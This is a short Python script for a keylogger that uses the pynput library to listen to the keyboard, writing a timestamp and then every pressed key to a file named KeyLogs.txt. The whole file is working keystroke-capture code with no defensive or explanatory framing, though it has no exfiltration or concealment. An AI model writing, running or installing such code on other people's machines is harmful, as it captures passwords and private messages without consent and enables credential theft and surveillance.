from datetime import datetime

import pynput.keyboard

"""

    This method is link with key binding using Keyboard 
    listener and call every time when any key is pressed 
    and store the pressed ke in keylogs.txt file.

"""


def process_key_press(key):
    with open("KeyLogs.txt", "a") as f:
        w = str(key) + "\n"
        f.write(w)


def key_logging():
    with open("KeyLogs.txt", "w") as f:
        now = str(datetime.now()) + "\n"
        print(now)
        f.write(now)
        keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
        with keyboard_listener:
            keyboard_listener.join()


if __name__ == "__main__":
    key_logging()
